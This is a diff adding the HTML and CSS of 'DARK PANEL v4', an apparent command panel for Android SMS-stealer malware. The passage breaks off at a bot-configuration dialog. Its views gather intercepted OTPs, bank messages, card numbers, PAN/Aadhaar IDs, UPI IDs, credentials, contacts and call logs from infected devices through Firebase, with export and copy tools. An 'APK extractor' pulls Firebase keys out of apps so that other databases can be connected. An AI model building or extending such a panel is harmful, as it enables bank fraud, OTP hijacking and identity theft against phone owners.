@@ -1,0 +1,1659 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{color-scheme:light}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DARK PANEL v4</title>
+<style>
+:root{--bg:#07070f;--bg2:#0d0d1a;--bg3:#111122;--card:#0f0f1e;--border:#1a1a2e;--border2:#252540;--accent:#6d28d9;--accent2:#8b5cf6;--accent3:#a78bfa;--green:#10b981;--red:#ef4444;--yellow:#f59e0b;--cyan:#06b6d4;--pink:#ec4899;--orange:#f97316;--text:#e2e8f0;--muted:#4b5563;--muted2:#6b7280}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif}
+/* HEADER */
+.hdr{display:flex;align-items:center;gap:10px;padding:0 16px;height:50px;background:linear-gradient(90deg,#08081a,#0e0820);border-bottom:1px solid var(--border);flex-shrink:0;z-index:100}
+.logo{font-size:17px;font-weight:900;letter-spacing:3px;background:linear-gradient(135deg,#a78bfa,#38bdf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.ver{font-size:9px;color:var(--muted);background:var(--bg3);border:1px solid var(--border2);padding:2px 7px;border-radius:3px;letter-spacing:1px}
+.hdr-right{margin-left:auto;display:flex;align-items:center;gap:8px}
+.conn-wrap{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--muted2)}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--red);flex-shrink:0;transition:.3s}
+.dot.on{background:var(--green);box-shadow:0 0 6px var(--green);animation:blink 2s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.hbtn{padding:5px 12px;border-radius:6px;border:1px solid var(--border2);background:var(--bg3);color:var(--text);font-size:11px;cursor:pointer;transition:.2s;white-space:nowrap}
+.hbtn:hover{border-color:var(--accent2);color:var(--accent3)}
+.hbtn.pri{background:linear-gradient(135deg,var(--accent),var(--accent2));border:none;color:#fff}
+.hbtn.pri:hover{opacity:.85}
+/* TICKER */
+.ticker{display:none;align-items:center;height:26px;background:#0a0a18;border-bottom:1px solid var(--border);padding:0 14px;gap:10px;flex-shrink:0;overflow:hidden}
+.ticker.show{display:flex}
+.tick-lbl{font-size:9px;font-weight:700;color:var(--accent3);letter-spacing:1px;white-space:nowrap}
+.tick-track{flex:1;overflow:hidden;position:relative;height:16px}
+.tick-inner{display:flex;gap:32px;position:absolute;white-space:nowrap;animation:scroll 18s linear infinite}
+@keyframes scroll{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+.totp{color:var(--green);font-weight:700;font-family:monospace;font-size:11px}
+/* LAYOUT */
+.wrap{display:flex;flex:1;overflow:hidden}
+/* SIDEBAR */
+.sb{width:220px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0}
+.sb-accs{padding:10px;border-bottom:1px solid var(--border);max-height:200px;overflow-y:auto}
+.sb-accs-title{font-size:9px;color:var(--muted);text-transform:uppercase;letter-spacing:1.2px;font-weight:700;margin-bottom:7px}
+.acc-card{background:var(--card);border:1px solid var(--border);border-radius:7px;padding:8px 10px;margin-bottom:5px;cursor:pointer;transition:.15s;position:relative}
+.acc-card:hover{border-color:var(--border2)}
+.acc-card.act{border-color:var(--accent);background:#6d28d912}
+.acc-name{font-size:11px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;padding-right:14px}
+.acc-url{font-size:9px;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:1px}
+.acc-x{position:absolute;top:7px;right:7px;font-size:10px;color:var(--muted);cursor:pointer;opacity:0;transition:.15s}
+.acc-card:hover .acc-x{opacity:1}
+.sb-nav{padding:8px;flex:1;overflow-y:auto}
+.nav-sec{font-size:8px;color:var(--muted);text-transform:uppercase;letter-spacing:1.5px;padding:8px 8px 3px;font-weight:700}
+.ni{display:flex;align-items:center;gap:8px;padding:7px 9px;border-radius:6px;cursor:pointer;font-size:11px;color:var(--muted2);transition:.15s;margin-bottom:1px;position:relative}
+.ni:hover{background:var(--bg3);color:var(--text)}
+.ni.act{background:#6d28d915;color:var(--accent3);font-weight:600}
+.ni.act::before{content:'';position:absolute;left:0;top:25%;bottom:25%;width:2px;background:var(--accent2);border-radius:2px}
+.nbadge{margin-left:auto;font-size:9px;padding:1px 5px;border-radius:8px;background:var(--bg3);color:var(--muted2);border:1px solid var(--border)}
+.nbadge.hot{background:#6d28d922;color:var(--accent3);border-color:var(--accent)55}
+/* CONTENT */
+.content{flex:1;display:flex;flex-direction:column;overflow:hidden}
+.view{display:none;flex:1;overflow-y:auto;padding:16px 18px}
+.view.act{display:block}
+/* STATS */
+.stats{display:grid;grid-template-columns:repeat(6,1fr);gap:8px;margin-bottom:14px}
+.stat{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:10px;text-align:center}
+.stat .n{font-size:22px;font-weight:800;color:var(--c,var(--text))}
+.stat .l{font-size:9px;color:var(--muted2);text-transform:uppercase;letter-spacing:.5px;margin-top:2px}
+.s0{--c:var(--text)}.s1{--c:var(--green)}.s2{--c:var(--red)}.s3{--c:var(--cyan)}.s4{--c:var(--yellow)}.s5{--c:var(--pink)}
+/* TOOLBAR */
+.tb{display:flex;align-items:center;gap:6px;margin-bottom:12px;flex-wrap:wrap}
+.flt{padding:3px 11px;border-radius:12px;border:1px solid var(--border);background:transparent;color:var(--muted2);font-size:10px;cursor:pointer;transition:.15s}
+.flt.act{background:var(--accent);border-color:var(--accent);color:#fff}
+.flt:hover:not(.act){border-color:var(--accent2);color:var(--accent3)}
+.srch{background:var(--card);border:1px solid var(--border);border-radius:6px;padding:4px 10px;color:var(--text);font-size:11px;outline:none;transition:.2s}
+.srch:focus{border-color:var(--accent)}
+.srt{background:var(--card);border:1px solid var(--border);color:var(--text);font-size:10px;padding:4px 7px;border-radius:5px;outline:none;cursor:pointer}
+/* DEVICE CARDS */
+.dgrid{display:flex;flex-direction:column;gap:7px}
+.dc{background:var(--card);border:1px solid var(--border);border-radius:9px;overflow:hidden;transition:.15s;cursor:pointer}
+.dc:hover{border-color:var(--border2)}
+.dc.open{border-color:var(--accent2)}
+.dc-top{display:flex;align-items:center;gap:10px;padding:10px 13px}
+.dc-icon{width:36px;height:36px;border-radius:7px;background:var(--bg3);display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0}
+.dc-info{flex:1;min-width:0}
+.dc-name{font-size:12px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dc-meta{font-size:10px;color:var(--muted2);margin-top:2px}
+.dc-right{display:flex;align-items:center;gap:6px;flex-shrink:0}
+.badge{padding:2px 7px;border-radius:3px;font-size:9px;font-weight:700;letter-spacing:.3px}
+.bon{background:#064e3b22;color:var(--green);border:1px solid #10b98133}
+.boff{background:#7f1d1d22;color:var(--red);border:1px solid #ef444433}
+.bsms{background:#0c4a6e22;color:var(--cyan);border:1px solid #06b6d433}
+.botp{background:#83184322;color:var(--pink);border:1px solid #ec489933}
+.bat-w{display:flex;flex-direction:column;align-items:center;gap:2px}
+.bat-bar{width:32px;height:4px;background:var(--bg3);border-radius:2px;overflow:hidden}
+.bat-fill{height:100%;border-radius:2px;transition:width .5s}
+.bat-lbl{font-size:8px;color:var(--muted)}
+/* DEVICE BODY */
+.dc-body{display:none;border-top:1px solid var(--border);padding:12px}
+.dc.open .dc-body{display:block}
+.dtabs{display:flex;gap:3px;margin-bottom:10px;overflow-x:auto}
+.dtab{padding:3px 10px;border-radius:4px;border:1px solid var(--border);background:transparent;color:var(--muted2);font-size:10px;cursor:pointer;transition:.15s;white-space:nowrap;flex-shrink:0}
+.dtab.act{background:var(--accent);border-color:var(--accent);color:#fff}
+.tc{display:none}.tc.act{display:block}
+/* SMS */
+.sms-i{background:var(--bg3);border-radius:6px;padding:8px 10px;margin-bottom:6px;border-left:3px solid var(--border2)}
+.sms-i.bank{border-left-color:var(--yellow)}
+.sms-i.otp{border-left-color:var(--green)}
+.sms-from{font-size:10px;font-weight:700;color:var(--accent3);margin-bottom:2px;display:flex;align-items:center;gap:6px}
+.sms-msg{font-size:11px;line-height:1.6;color:var(--text)}
+.sms-foot{display:flex;align-items:center;gap:6px;margin-top:4px}
+.sms-time{font-size:9px;color:var(--muted)}
+.cpbtn{font-size:9px;padding:1px 6px;border-radius:3px;border:1px solid var(--border);background:transparent;color:var(--muted2);cursor:pointer;transition:.15s}
+.cpbtn:hover{border-color:var(--accent2);color:var(--accent3)}
+.otpbig{font-size:28px;font-weight:900;color:var(--green);letter-spacing:5px;font-family:monospace;text-shadow:0 0 18px #10b98144;margin:4px 0}
+/* INFO */
+.igrid{display:grid;gap:6px;font-size:11px}
+.ir{display:flex;gap:8px;align-items:flex-start}
+.ik{color:var(--muted2);width:90px;flex-shrink:0;font-size:10px}
+.iv{color:var(--text);font-family:monospace;word-break:break-all;font-size:11px}
+/* ACTIONS */
+.abtn{padding:5px 12px;border-radius:5px;border:1px solid var(--border);background:var(--bg3);color:var(--text);font-size:10px;cursor:pointer;transition:.15s}
+.abtn:hover{border-color:var(--accent2);color:var(--accent3)}
+/* CMD */
+.cmd-wrap{display:flex;gap:6px;margin-top:8px}
+.cmd-inp{flex:1;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;padding:6px 10px;color:var(--text);font-size:11px;outline:none}
+.cmd-inp:focus{border-color:var(--accent)}
+/* RAW */
+.raw{font-family:monospace;font-size:10px;color:var(--muted2);background:var(--bg);border-radius:6px;padding:10px;overflow:auto;max-height:260px;border:1px solid var(--border);white-space:pre;line-height:1.8}
+.rk{color:var(--accent3)}.rs{color:var(--green)}.rn{color:var(--yellow)}.rb{color:var(--pink)}
+/* GLOBAL VIEWS */
+.sec-hdr{display:flex;align-items:center;gap:8px;margin-bottom:14px}
+.sec-hdr h3{font-size:13px;font-weight:700}
+.card-item{background:var(--card);border:1px solid var(--border);border-radius:7px;padding:10px 12px;margin-bottom:7px}
+.card-num{font-size:15px;font-weight:700;letter-spacing:2px;color:var(--text);font-family:monospace}
+.card-meta{font-size:10px;color:var(--muted2);margin-top:3px}
+.upi-chip{display:inline-flex;align-items:center;gap:6px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;padding:4px 10px;margin:3px;font-size:11px;font-family:monospace;color:var(--cyan)}
+/* AMOUNT */
+.amt-total{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
+.amt-box{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:14px;text-align:center}
+.amt-val{font-size:22px;font-weight:800;margin-bottom:3px}
+.amt-lbl{font-size:10px;color:var(--muted2)}
+/* TIMELINE */
+.tl-item{display:flex;gap:12px;margin-bottom:12px;position:relative}
+.tl-item::before{content:'';position:absolute;left:14px;top:24px;bottom:-12px;width:1px;background:var(--border)}
+.tl-dot{width:28px;height:28px;border-radius:50%;background:var(--bg3);border:1px solid var(--border2);display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0;z-index:1}
+.tl-body{flex:1;background:var(--card);border:1px solid var(--border);border-radius:7px;padding:9px 11px}
+.tl-top{display:flex;align-items:center;gap:8px;margin-bottom:3px;font-size:10px}
+.tl-dev{color:var(--accent3);font-weight:600}
+.tl-time{color:var(--muted2);margin-left:auto}
+/* MAGIC */
+.scan-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px;margin-bottom:14px}
+.scan-box{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px}
+.scan-lbl{font-size:9px;color:var(--muted2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:5px}
+.scan-val{font-size:20px;font-weight:800}
+/* CONTACTS / CALLS */
+.ct-item{display:flex;align-items:center;gap:10px;padding:8px 10px;background:var(--card);border:1px solid var(--border);border-radius:6px;margin-bottom:5px}
+.ct-icon{font-size:16px}
+.ct-info{flex:1}
+.ct-name{font-size:12px;font-weight:600}
+.ct-num{font-size:10px;color:var(--muted2)}
+/* LOG */
+.log-wrap{background:var(--bg);border-radius:7px;padding:10px;border:1px solid var(--border);font-family:monospace;font-size:10px;max-height:500px;overflow-y:auto}
+.ll{padding:2px 0;border-bottom:1px solid #ffffff05;color:var(--muted2)}
+.ll .lt{color:var(--accent3)}.ll .lok{color:var(--green)}.ll .lerr{color:var(--red)}
+/* MODAL */
+.mbg{display:none;position:fixed;inset:0;background:#00000099;z-index:600;align-items:center;justify-content:center}
+.mbg.show{display:flex}
+.modal{background:var(--card);border:1px solid var(--border2);border-radius:12px;padding:20px;width:440px;max-width:95vw;max-height:90vh;overflow-y:auto}
+.modal h3{font-size:14px;margin-bottom:16px;font-weight:700}
+.fld{margin-bottom:10px}
+.fld label{display:block;font-size:9px;color:var(--muted2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px;font-weight:600}
+.fld input,.fld select,.fld textarea{width:100%;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;padding:7px 10px;color:var(--text);font-size:11px;outline:none;transition:.2s;font-family:inherit}
+.fld input:focus,.fld select:focus{border-color:var(--accent)}
+.fld input::placeholder{color:var(--muted)}
+.btn{padding:8px;border-radius:6px;border:none;cursor:pointer;font-size:11px;font-weight:700;transition:.2s;width:100%}
+.btnp{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff}
+.btnp:hover{opacity:.85}
+.btng{background:transparent;border:1px solid var(--border2);color:var(--muted2)}
+.btng:hover{border-color:var(--accent2);color:var(--accent3)}
+/* APK */
+.apk-drop{border:2px dashed var(--border2);border-radius:9px;padding:26px;text-align:center;cursor:pointer;transition:.2s;color:var(--muted2);font-size:12px}
+.apk-drop:hover,.apk-drop.drag{border-color:var(--accent2);color:var(--accent3);background:#6d28d908}
+.apk-res{background:var(--bg3);border-radius:7px;padding:10px;margin-top:10px;font-family:monospace;font-size:11px;display:none}
+.apk-res.show{display:block}
+.apk-row{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border)}
+.apk-row:last-child{border:none}
+.apk-k{color:var(--muted2)}
+.apk-v{color:var(--green);word-break:break-all;text-align:right;max-width:55%}
+/* TOAST */
+#toast{position:fixed;bottom:18px;right:18px;background:var(--card);border:1px solid var(--accent);border-radius:7px;padding:9px 14px;font-size:11px;color:var(--text);z-index:900;display:none;animation:tin .2s ease}
+@keyframes tin{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+/* EMPTY */
+.empty{text-align:center;padding:40px 20px;color:var(--muted)}
+.empty-icon{font-size:34px;margin-bottom:8px}
+.empty p{font-size:12px}
+/* NOTIF badge */
+.notif-on{color:var(--green);font-size:9px;margin-left:4px}
+/* SCROLLBAR */
+::-webkit-scrollbar{width:3px;height:3px}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+::-webkit-scrollbar-track{background:transparent}
+@media(max-width:700px){.sb{display:none}.stats{grid-template-columns:repeat(3,1fr)}}
+</style>
+</head>
+<body style="display:flex;flex-direction:column;height:100%">
+
+<!-- HEADER -->
+<div class="hdr">
+  <div class="logo">◈ DARK</div>
+  <span class="ver">PANEL v4.0</span>
+  <div class="hdr-right">
+    <div class="conn-wrap">
+      <div class="dot" id="dot"></div>
+      <span id="connLbl">Disconnected</span>
+      <span id="notifBadge" class="notif-on" style="display:none">🔔</span>
+    </div>
+    <button class="hbtn" onclick="openM('connect')">＋ Account</button>
+    <button class="hbtn" onclick="doRefresh()">↻ Refresh</button>
+    <button class="hbtn" onclick="openM('apk')">📦 APK</button>
+    <button class="hbtn" onclick="openM('bots')">⚙ Bots</button>
+  </div>
+</div>
+
+<!-- TICKER -->
+<div class="ticker" id="ticker">
+  <span class="tick-lbl">🔑 LIVE OTPs</span>
+  <div class="tick-track"><div class="tick-inner" id="tickInner"></div></div>
+</div>
+
+<!-- MAIN WRAP -->
+<div class="wrap" style="flex:1;overflow:hidden">
+
+<!-- SIDEBAR -->
+<div class="sb">
+  <div class="sb-accs">
+    <div class="sb-accs-title">Accounts</div>
+    <div id="accList"></div>
+    <button class="hbtn" style="width:100%;margin-top:6px;font-size:10px" onclick="openM('connect')">＋ Add Account</button>
+  </div>
+  <div class="sb-nav">
+    <div class="nav-sec">Views</div>
+    <div class="ni act" data-v="devices" onclick="sv(this)">📱 Devices <span class="nbadge" id="nb0">0</span></div>
+    <div class="ni" data-v="otp" onclick="sv(this)">🔑 OTPs <span class="nbadge hot" id="nb1">0</span></div>
+    <div class="ni" data-v="bank" onclick="sv(this)">🏦 Bank SMS <span class="nbadge" id="nb2">0</span></div>
+    <div class="ni" data-v="cards" onclick="sv(this)">💳 Cards <span class="nbadge" id="nb3">0</span></div>
+    <div class="ni" data-v="pan" onclick="sv(this)">🪪 PAN / Aadhaar <span class="nbadge" id="nb10">0</span></div>
+    <div class="ni" data-v="upi" onclick="sv(this)">⚡ UPI IDs <span class="nbadge" id="nb4">0</span></div>
+    <div class="ni" data-v="amounts" onclick="sv(this)">💰 Amounts <span class="nbadge" id="nb5">0</span></div>
+    <div class="ni" data-v="creds" onclick="sv(this)">🔐 Creds <span class="nbadge" id="nb6">0</span></div>
+    <div class="ni" data-v="allsms" onclick="sv(this)">💬 All SMS <span class="nbadge" id="nb7">0</span></div>
+    <div class="nav-sec">Data</div>
+    <div class="ni" data-v="contacts" onclick="sv(this)">👤 Contacts <span class="nbadge" id="nb8">0</span></div>
+    <div class="ni" data-v="calls" onclick="sv(this)">📞 Call Logs <span class="nbadge" id="nb9">0</span></div>
+    <div class="nav-sec">Tools</div>
+    <div class="ni" data-v="magic" onclick="sv(this)">✨ Magic Scan</div>
+    <div class="ni" data-v="timeline" onclick="sv(this)">📅 Timeline</div>
+    <div class="ni" data-v="rawdb" onclick="sv(this)">🌲 Raw DB</div>
+    <div class="ni" data-v="log" onclick="sv(this)">📋 Log</div>
+  </div>
+</div>
+
+<!-- CONTENT -->
+<div class="content">
+
+<!-- DEVICES -->
+<div class="view act" id="view-devices">
+  <div class="stats">
+    <div class="stat s0"><div class="n" id="st0">0</div><div class="l">Total</div></div>
+    <div class="stat s1"><div class="n" id="st1">0</div><div class="l">Online</div></div>
+    <div class="stat s2"><div class="n" id="st2">0</div><div class="l">Offline</div></div>
+    <div class="stat s3"><div class="n" id="st3">0</div><div class="l">SMS</div></div>
+    <div class="stat s4"><div class="n" id="st4">0</div><div class="l">Bank</div></div>
+    <div class="stat s5"><div class="n" id="st5">0</div><div class="l">OTPs</div></div>
+  </div>
+  <div class="tb">
+    <button class="flt act" onclick="setFlt('all',this)">All</button>
+    <button class="flt" onclick="setFlt('online',this)">Online</button>
+    <button class="flt" onclick="setFlt('offline',this)">Offline</button>
+    <select class="srt" onchange="S.sort=this.value;renderDevs()">
+      <option value="newest">Sort: Newest</option>
+      <option value="oldest">Sort: Oldest</option>
+      <option value="name">Sort: Name</option>
+      <option value="battery">Sort: Battery</option>
+      <option value="sms">Sort: SMS Count</option>
+    </select>
+    <input class="srch" placeholder="🔍 Search…" oninput="renderDevs()" id="devSrch" style="margin-left:auto;width:180px">
+  </div>
+  <div class="dgrid" id="dgrid">
+    <div class="empty"><div class="empty-icon">🔌</div><p>Connect a Firebase account to start</p></div>
+  </div>
+</div>
+
+<!-- OTP -->
+<div class="view" id="view-otp">
+  <div class="sec-hdr">
+    <h3>🔑 Live OTPs</h3>
+    <button class="hbtn" style="margin-left:auto" onclick="copyAllOtps()">Copy All</button>
+    <button class="hbtn" onclick="exportData('otp')">⬇ Export</button>
+  </div>
+  <div id="otpList"><div class="empty"><div class="empty-icon">🔑</div><p>No OTPs captured</p></div></div>
+</div>
+
+<!-- BANK -->
+<div class="view" id="view-bank">
+  <div class="sec-hdr">
+    <h3>🏦 Bank SMS</h3>
+    <button class="hbtn" style="margin-left:auto" onclick="exportData('bank')">⬇ Export</button>
+  </div>
+  <div id="bankList"><div class="empty"><div class="empty-icon">🏦</div><p>No bank SMS</p></div></div>
+</div>
+
+<!-- CARDS -->
+<div class="view" id="view-cards">
+  <div class="sec-hdr">
+    <h3>💳 Card Details</h3>
+    <button class="hbtn" style="margin-left:auto" onclick="exportData('cards')">⬇ Export</button>
+    <button class="hbtn" onclick="copyAllCards()">Copy All</button>
+  </div>
+  <div id="cardSummary" style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:14px">
+    <div class="scan-box"><div class="scan-lbl">Cards Found</div><div class="scan-val" id="crd-total" style="color:var(--cyan)">0</div></div>
+    <div class="scan-box"><div class="scan-lbl">Unique Last4</div><div class="scan-val" id="crd-uniq" style="color:var(--accent3)">0</div></div>
+    <div class="scan-box"><div class="scan-lbl">Debit Cards</div><div class="scan-val" id="crd-debit" style="color:var(--yellow)">0</div></div>
+    <div class="scan-box"><div class="scan-lbl">Credit Cards</div><div class="scan-val" id="crd-credit" style="color:var(--pink)">0</div></div>
+  </div>
+  <div id="cardList"><div class="empty"><div class="empty-icon">💳</div><p>No cards detected</p></div></div>
+</div>
+
+<!-- UPI -->
+<div class="view" id="view-upi">
+  <div class="sec-hdr">
+    <h3>⚡ UPI & Payments</h3>
+    <button class="hbtn" style="margin-left:auto" onclick="copyUPIs()">Copy All UPIs</button>
+  </div>
+  <div id="upiSummary" style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px">
+    <div class="scan-box"><div class="scan-lbl">Unique UPI IDs</div><div class="scan-val" id="upi-total" style="color:var(--cyan)">0</div></div>
+    <div class="scan-box"><div class="scan-lbl">Linked Banks</div><div class="scan-val" id="upi-banks" style="color:var(--yellow)">0</div></div>
+    <div class="scan-box"><div class="scan-lbl">UPI Txns</div><div class="scan-val" id="upi-txns" style="color:var(--green)">0</div></div>
+  </div>
+  <div id="upiList"><div class="empty"><div class="empty-icon">⚡</div><p>No UPI IDs found</p></div></div>
+</div>
+
+<!-- PAN / AADHAAR -->
+<div class="view" id="view-pan">
+  <div class="sec-hdr">
+    <h3>🪪 PAN / Aadhaar</h3>
+    <button class="hbtn" style="margin-left:auto" onclick="exportData('pan')">⬇ Export</button>
+    <button class="hbtn" onclick="copyAllPAN()">Copy All</button>
+  </div>
+  <p style="font-size:10px;color:var(--muted2);margin-bottom:14px">Extracted from SMS — patterns: PAN (ABCDE1234F), Aadhaar (12-digit / last 4), account numbers</p>
+  <div id="panList"><div class="empty"><div class="empty-icon">🪪</div><p>No PAN / Aadhaar detected</p></div></div>
+</div>
+
+<!-- AMOUNTS -->
+<div class="view" id="view-amounts">
+  <div class="sec-hdr"><h3>💰 Amount Tracker</h3></div>
+  <div class="amt-total">
+    <div class="amt-box"><div class="amt-val" id="totalDebit" style="color:var(--red)">₹0</div><div class="amt-lbl">Total Debited</div></div>
+    <div class="amt-box"><div class="amt-val" id="totalCredit" style="color:var(--green)">₹0</div><div class="amt-lbl">Total Credited</div></div>
+  </div>
+  <div id="amtList"><div class="empty"><div class="empty-icon">💰</div><p>No transactions found</p></div></div>
+</div>
+
+<!-- CREDS -->
+<div class="view" id="view-creds">
+  <div class="sec-hdr"><h3>🔐 Credentials / Tokens</h3></div>
+  <div id="credList"><div class="empty"><div class="empty-icon">🔐</div><p>No credentials detected</p></div></div>
+</div>
+
+<!-- ALL SMS -->
+<div class="view" id="view-allsms">
+  <div class="sec-hdr">
+    <h3>💬 All SMS <span id="smsTotal" style="font-size:11px;color:var(--muted2);font-weight:400">(0)</span></h3>
+    <input class="srch" placeholder="🔍 Filter…" oninput="renderAllSMS(this.value)" style="margin-left:auto;width:180px">
+    <button class="hbtn" onclick="exportData('sms')">⬇ Export</button>
+  </div>
+  <div id="allSmsList"><div class="empty"><div class="empty-icon">💬</div><p>No messages</p></div></div>
+</div>
+
+<!-- CONTACTS -->
+<div class="view" id="view-contacts">
+  <div class="sec-hdr"><h3>👤 Contacts</h3><button class="hbtn" style="margin-left:auto" onclick="loadContacts()">↻ Reload</button></div>
+  <div id="contactList"><div class="empty"><div class="empty-icon">👤</div><p>No contacts found — requires /contacts node in Firebase</p></div></div>
+</div>
+
+<!-- CALLS -->
+<div class="view" id="view-calls">
+  <div class="sec-hdr"><h3>📞 Call Logs</h3><button class="hbtn" style="margin-left:auto" onclick="loadCalls()">↻ Reload</button></div>
+  <div id="callList"><div class="empty"><div class="empty-icon">📞</div><p>No call logs — requires /calls node in Firebase</p></div></div>
+</div>
+
+<!-- MAGIC -->
+<div class="view" id="view-magic">
+  <div class="sec-hdr"><h3>✨ Magic Scan</h3></div>
+  <div class="scan-grid" id="scanGrid">
+    <div class="scan-box"><div class="scan-lbl">Total OTPs</div><div class="scan-val" id="sc0" style="color:var(--pink)">—</div></div>
+    <div class="scan-box"><div class="scan-lbl">Bank Msgs</div><div class="scan-val" id="sc1" style="color:var(--yellow)">—</div></div>
+    <div class="scan-box"><div class="scan-lbl">Cards Found</div><div class="scan-val" id="sc2" style="color:var(--cyan)">—</div></div>
+    <div class="scan-box"><div class="scan-lbl">UPI IDs</div><div class="scan-val" id="sc3" style="color:var(--green)">—</div></div>
+    <div class="scan-box"><div class="scan-lbl">Total Debit</div><div class="scan-val" id="sc4" style="color:var(--red)">—</div></div>
+    <div class="scan-box"><div class="scan-lbl">Total Credit</div><div class="scan-val" id="sc5" style="color:var(--green)">—</div></div>
+    <div class="scan-box"><div class="scan-lbl">Online Devices</div><div class="scan-val" id="sc6" style="color:var(--green)">—</div></div>
+    <div class="scan-box"><div class="scan-lbl">Avg Battery</div><div class="scan-val" id="sc7" style="color:var(--accent3)">—</div></div>
+  </div>
+  <div style="margin-top:12px">
+    <div style="font-size:10px;color:var(--muted2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px">Top Banks Detected</div>
+    <div id="bankKW" style="display:flex;flex-wrap:wrap;gap:5px"></div>
+  </div>
+  <div style="margin-top:14px">
+    <div style="font-size:10px;color:var(--muted2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px">Most Active Devices</div>
+    <div id="topDevs"></div>
+  </div>
+</div>
+
+<!-- TIMELINE -->
+<div class="view" id="view-timeline">
+  <div class="sec-hdr"><h3>📅 Timeline</h3></div>
+  <div id="tlList"><div class="empty"><div class="empty-icon">📅</div><p>No events</p></div></div>
+</div>
+
+<!-- RAW DB -->
+<div class="view" id="view-rawdb">
+  <div class="sec-hdr">
+    <h3>🌲 Raw Firebase DB</h3>
+    <input class="srch" id="rawPath" placeholder="/path or blank=root" style="width:200px">
+    <button class="hbtn pri" onclick="fetchRaw()">Fetch</button>
+    <button class="hbtn" onclick="cpRaw()">Copy</button>
+  </div>
+  <div class="raw" id="rawTree">Connect an account and click Fetch.</div>
+</div>
+
+<!-- LOG -->
+<div class="view" id="view-log">
+  <div class="sec-hdr"><h3>📋 Activity Log</h3><button class="hbtn" style="margin-left:auto" onclick="clearLog()">Clear</button></div>
+  <div class="log-wrap" id="logWrap"><div class="ll" style="color:var(--muted)">No events.</div></div>
+</div>
+
+</div><!-- /content -->
+</div><!-- /wrap -->
+
+<!-- MODALS -->
+
+<!-- CONNECT -->
+<div class="mbg" id="modal-connect">
+  <div class="modal">
+    <h3>🔗 Add Firebase Account</h3>
+    <div class="fld"><label>Nickname</label><input id="m-nick" placeholder="My App"></div>
+    <div class="fld"><label>Firebase Database URL</label><input id="m-url" placeholder="https://your-app-default-rtdb.firebaseio.com"></div>
+    <div class="fld"><label>API Key (blank if public DB)</label><input id="m-key" placeholder="AIzaSy..."></div>
+    <div class="fld"><label>Device Node Path (default: /devices)</label><input id="m-devpath" placeholder="/devices" value="/devices"></div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:4px">
+      <button class="btn btnp" onclick="addAcc()">Save & Connect</button>
+      <button class="btn btng" onclick="closeMs()">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<!-- APK -->
+<div class="mbg" id="modal-apk">
+  <div class="modal">
+    <h3>📦 APK Firebase Extractor</h3>
+    <p style="font-size:10px;color:var(--muted2);margin-bottom:12px">Upload APK — scans binary for Firebase URLs, API keys, google-services.json data.</p>
+    <div class="apk-drop" id="apkDrop" onclick="document.getElementById('apkFile').click()"
+      ondragover="event.preventDefault();this.classList.add('drag')"
+      ondragleave="this.classList.remove('drag')"
+      ondrop="event.preventDefault();this.classList.remove('drag');handleAPK(event.dataTransfer.files[0])">
+      📂 Click or drag APK file here
+    </div>
+    <input type="file" id="apkFile" accept=".apk" style="display:none" onchange="handleAPK(this.files[0])">
+    <div class="apk-res" id="apkRes">
+      <div class="apk-row"><span class="apk-k">Firebase URL</span><span class="apk-v" id="apkFbUrl">—</span></div>
+      <div class="apk-row"><span class="apk-k">API Key</span><span class="apk-v" id="apkApiKey">—</span></div>
+      <div class="apk-row"><span class="apk-k">Project ID</span><span class="apk-v" id="apkPid">—</span></div>
+      <div class="apk-row"><span class="apk-k">App ID</span><span class="apk-v" id="apkAppId">—</span></div>
+      <div class="apk-row"><span class="apk-k">Sender ID</span><span class="apk-v" id="apkSender">—</span></div>
+      <div class="apk-row"><span class="apk-k">Storage Bucket</span><span class="apk-v" id="apkBucket">—</span></div>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:12px">
+      <button class="btn btnp" id="apkConnBtn" style="display:none" onclick="connFromAPK()">🔗 Connect This DB</button>
+      <button class="btn btng" onclick="closeMs()">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- BOTS -->
+<div class="mbg" id="modal-bots">
+  <div class="modal">
+    <h3>⚙ Bot Configuration</h3>
